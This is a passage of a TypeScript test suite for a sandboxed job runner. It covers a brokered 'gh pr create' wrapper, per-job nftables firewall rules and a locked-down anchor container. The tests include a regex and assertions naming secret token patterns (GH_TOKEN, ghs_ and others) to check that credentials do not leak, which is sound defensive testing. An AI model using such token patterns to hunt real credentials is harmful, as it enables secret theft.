			expect(failureText).not.toContain("ghs_pull_request_secret");
		} finally {
			await broker.stop();
		}
	});

	it("translates only supported gh pr create flags into the broker contract", async () => {
		let requestCount = 0;
		let capturedBody: unknown;
		let capturedPlaceholder: string | null = null;
		const server = Bun.serve({
			hostname: "127.0.0.1",
			port: 0,
			async fetch(request) {
				requestCount += 1;
				capturedPlaceholder = request.headers.get("x-ompk-placeholder");
				capturedBody = await request.json();
				return Response.json({
					number: 52,
					url: "https://github.com/kingkillery/oh-my-pk/pull/52",
					draft: true,
				});
			},
		});
		const wrapper = join(import.meta.dir, "../relay/git-hooks/gh").replaceAll("\\", "/");
		const runWrapper = async (args: string[]): Promise<{ exitCode: number; stdout: string; stderr: string }> => {
			const child = Bun.spawn(["sh", wrapper, ...args], {
				env: {
					...process.env,
					NO_PROXY: "127.0.0.1",
					no_proxy: "127.0.0.1",
					OMPK_BROKER_URL: `http://127.0.0.1:${server.port}`,
					OMPK_BROKER_CREDENTIAL: "wrapper-placeholder",
					OMPK_GITHUB_REPO: "kingkillery/oh-my-pk",
					OMPK_GITHUB_DEFAULT_BRANCH: "main",
				},
				stdout: "pipe",
				stderr: "pipe",
			});
			const [exitCode, stdout, stderr] = await Promise.all([
				child.exited,
				new Response(child.stdout).text(),
				new Response(child.stderr).text(),
			]);
			return { exitCode, stdout, stderr };
		};
		try {
			const valid = await runWrapper([
				"pr",
				"create",
				"-R",
				"kingkillery/oh-my-pk",
				"-B",
				"main",
				"-H",
				"ompk/wrapper-contract",
				"-t",
				"Wrapper title",
				"-b",
				"Body with 'quotes'\nand a newline",
				"--draft",
			]);
			expect(valid).toEqual({
				exitCode: 0,
				stdout: "https://github.com/kingkillery/oh-my-pk/pull/52\n",
				stderr: "",
			});
			expect(capturedPlaceholder).toBe("wrapper-placeholder");
			expect(capturedBody).toEqual({
				title: "Wrapper title",
				body: "Body with 'quotes'\nand a newline",
				base: "main",
				head: "ompk/wrapper-contract",
				draft: true,
			});

			const foreign = await runWrapper([
				"pr",
				"create",
				"--repo=kingkillery/other",
				"--head=ompk/nope",
				"--title=Nope",
			]);
			expect(foreign.exitCode).toBe(2);
			expect(foreign.stderr).toContain("outside this job's broker scope");
			expect(requestCount).toBe(1);

			const unsupported = await runWrapper(["api", "repos/kingkillery/oh-my-pk"]);
			expect(unsupported.exitCode).toBe(2);
			expect(unsupported.stderr).toContain("supports only 'gh pr create'");
			expect(requestCount).toBe(1);
		} finally {
			await server.stop(true);
		}
	});
});

describe("per-job network firewall", () => {
	it("allows only active proxy and broker ports before dropping bridge traffic", () => {
		const commands = buildFirewallCommands("ompk_job_1", "podman42", [32000, 31000, 32000]);
		expect(commands).toHaveLength(4);
		expect(commands[2]).toEqual([
			"nft",
			"add",
			"rule",
			"inet",
			"ompk_job_1",
			"input",
			"iifname",
			"podman42",
			"tcp",
			"dport",
			"{",
			"31000",
			",",
			"32000",
			"}",
			"accept",
		]);
		expect(commands[3]?.slice(-3)).toEqual(["iifname", "podman42", "drop"]);
	});

	it("uses attempt-specific network and firewall identities", () => {
		const longJobId = `job-${"x".repeat(100)}`;
		expect(deriveFirewallTableName(longJobId, "attempt-a")).not.toBe(deriveFirewallTableName(longJobId, "attempt-b"));
		expect(deriveJobNetworkName(longJobId, "attempt-a")).not.toBe(deriveJobNetworkName(longJobId, "attempt-b"));
	});

	it("runs a trusted anchor to readiness before installing any firewall rule", async () => {
		const events: string[] = [];
		const network = await createJobNetwork("job-anchor", "attempt-1", "registry.test/trusted-agent:1", {
			runCommand: async command => {
				if (command[1] === "network") events.push("network-create");
				else if (command[1] === "run") events.push("anchor-start");
				else events.push("firewall-rule");
			},
			inspectNetwork: async () => {
				events.push("network-inspect");
				return { gatewayIp: "10.89.0.1", networkInterface: "podman1" };
			},
			waitForGateway: async () => {
				events.push("gateway-ready");
			},
			clearFirewall: async () => {
				events.push("firewall-clear");
			},
			forceRemoveAnchor: async name => {
				events.push(`anchor-remove:${name}`);
			},
			removeNetwork: async name => {
				events.push(`network-remove:${name}`);
			},
		});

		expect(events).toEqual(["network-create", "network-inspect", "anchor-start", "gateway-ready"]);
		await network.setAllowedPorts([31_000]);
		expect(events.indexOf("gateway-ready")).toBeLessThan(events.indexOf("firewall-rule"));
		await network.remove();
		await network.remove();
		expect(events.filter(event => event.startsWith("anchor-remove:"))).toEqual([
			`anchor-remove:${deriveNetworkAnchorName("job-anchor", "attempt-1")}`,
		]);
		expect(events.at(-1)).toBe(`network-remove:${deriveJobNetworkName("job-anchor", "attempt-1")}`);
	});

	it("builds an inert anchor without host environment, secrets, workspace, or mounts", () => {
		const args = buildNetworkAnchorArgs("registry.test/trusted-agent:1", "ompk-job-anchor", "ompk-job-anchor-anchor");
		expect(args).toContain("--network=ompk-job-anchor");
		expect(args).toContain("--http-proxy=false");
		expect(args).toContain("--read-only");
		expect(args).toContain("--cap-drop=all");
		expect(args).toContain("--security-opt=no-new-privileges");
		expect(args).toContain("--stop-timeout=1");
		expect(args).toContain("--entrypoint=/bin/sh");
		expect(args).not.toContain("--volume");
		expect(args).not.toContain("--mount");
		expect(args).not.toContain("--env");
		expect(args).not.toContain("--env-file");
		expect(args.some(arg => arg.includes("/workspace"))).toBe(false);
		expect(args.some(arg => /RELAY_TOKEN|GH_TOKEN|OMPK_FENCE_TOKEN|ghs_/.test(arg))).toBe(false);
	});

	it("times out readiness and force-cleans partial anchor startup failures", async () => {
		let probes = 0;
		await expect(
			waitForNetworkGateway("10.89.0.1", {
				timeoutMs: 0,
				retryMs: 1,
				probe: async () => {
					probes += 1;
					return false;
				},
				sleep: async () => {
					throw new Error("readiness timeout must not sleep");
				},
			}),
		).rejects.toThrow("did not become bindable within 0ms");
		expect(probes).toBe(1);

		for (const failurePoint of ["anchor-start", "gateway-ready"] as const) {
			const events: string[] = [];
			await expect(
				createJobNetwork("job-partial", failurePoint, "registry.test/trusted-agent:1", {
					runCommand: async command => {
						if (command[1] === "network") {
							events.push("network-create");
							return;
						}
						events.push("anchor-start");
						if (failurePoint === "anchor-start") throw new Error("anchor failed");
					},
					inspectNetwork: async () => {
						events.push("network-inspect");
						return { gatewayIp: "10.89.0.1", networkInterface: "podman1" };
					},
					waitForGateway: async () => {
						events.push("gateway-ready");
						throw new Error("gateway readiness failed");
					},
					clearFirewall: async () => {
						events.push("firewall-clear");
					},
					forceRemoveAnchor: async () => {
						events.push("anchor-remove");
					},
					removeNetwork: async () => {
						events.push("network-remove");
					},
				}),
			).rejects.toThrow(failurePoint === "anchor-start" ? "anchor failed" : "gateway readiness failed");
			expect(events.slice(-2)).toEqual(["anchor-remove", "network-remove"]);
			expect(events).not.toContain("firewall-clear");
		}
	});
});
